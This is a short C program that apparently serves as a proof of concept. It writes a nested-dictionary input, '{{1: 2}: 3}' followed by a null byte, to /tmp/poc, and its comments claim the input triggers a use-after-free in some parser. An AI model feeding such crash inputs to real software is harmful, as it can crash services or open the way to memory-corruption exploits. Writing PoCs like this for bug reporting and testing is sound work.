#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    // Nested dict: outer dict uses inner dict as key
    // Format: {{1: 2}: 3}
    // This forces the inner dict to be freed while the outer dict still holds a reference
    fprintf(f, "{{1: 2}: 3}");
    fputc('\0', f);
    fclose(f);
    return 0;
}